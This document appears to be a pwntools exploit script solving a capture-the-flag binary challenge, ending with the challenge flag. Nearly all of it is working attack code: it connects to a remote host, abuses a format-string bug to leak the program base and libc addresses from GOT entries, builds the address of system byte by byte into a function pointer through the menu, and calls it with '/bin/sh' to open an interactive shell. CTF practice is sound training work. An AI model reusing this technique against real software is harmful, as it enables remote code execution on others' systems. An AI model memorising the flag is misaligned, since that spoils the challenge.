from pwn import *
context.log_level = 'INFO'

if args.REMOTE:
    p = remote('45.76.30.75',1337)
else:
    p = process('./chal_patched',env={},stdout=process.PTY, stdin=process.PTY)
    # gdb.attach(p,gdbscript= 'b printf')

elf             = ELF('./chal_patched',checksec=False)
libc            = ELF('./lib/libc.so.6',checksec=False)
elf.address     = 0x0
libc.address    = 0x0

printf_off = ((elf.got.printf       - elf.symbols.ptrs)// 8)+1
banter_off = ((elf.symbols.banter   - elf.symbols.ptrs)// 8)+1

s2p = lambda x : u64(x.ljust(8,b'\0'))

def leak_address(off):
    payload = str(printf_off).encode()
    payload+= b' '
    payload+= f'%{off}$p'.encode()
    p.sendlineafter(b'> ',payload)
    p.recvuntil(f'You selected {printf_off}\n'.encode())
    leak = p.recvuntil(b'Select an option')[:-len(b'Select an option')]
    return leak


def leak_string(addr):
    # offset between where the $RSP - the address we place on the stack when calling printf
    off = ((0x00007fffffffdc80 - 0x7fffffffdc38)// 8)+5 

    payload = str(printf_off).encode()
    payload+= b'A'*5
    payload+= f'%{off}$s\n'.encode().ljust(8,b'A')
    payload+= p64(addr)
    
    p.sendlineafter(b'>',payload)

    p.recvuntil(f'You selected {printf_off}\n'.encode())
    p.recvuntil(b'AAAA')
    leak = p.recvline()[:-1]
    return leak


# bruteforced after a few tries to find a valid binary address on remote
main_leak_off = ((0x00007fffffffdd98 - 0x7fffffffdc38)//8 + 5)-10   
main = (int(leak_address(main_leak_off),base=16)&(~0xfff))+0x1000*-1


elf.address = main
log.success(f"bin_base: 0x{elf.address:012x}")

log.info(f"\tprintf:  0x{s2p(leak_string(elf.got.printf)):012x} ")    # 0x7fe5ce422c90
log.info(f"\tputs:    0x{s2p(leak_string(elf.got.puts)):012x} "  )    # 0x7fe5ce445420
log.info(f"\tread:    0x{s2p(leak_string(elf.got.read)):012x} "  )    # 0x7fe5ce4cf1e0


libc.address = s2p(leak_string(elf.got.puts)) - libc.symbols["_IO_puts"]
log.success(f"libc_base: 0x{libc.address:012x}")

for i in range(5,-1,-1):
    x = ((libc.symbols.system & (0xff <<i*8) ) >> (i*8))
    p.sendlineafter(b'> ',f'3 {x}'.encode())            # [taunt] to set the least significat byte on banter
    if i!=0:
        p.sendlineafter(b'> ',b'2')                     # [lob] to left shift it by 8 bits
    


payload = str(banter_off).encode()
payload+= b' '
payload+= f'/bin/sh\0'.encode()

p.sendlineafter(b'> ',payload)
p.success('popping a shell')
p.clean()
p.interactive()

# wctf{y0u_c4nt_b3_s3r1ous_appr0ved_g4dg3t5_0nly}
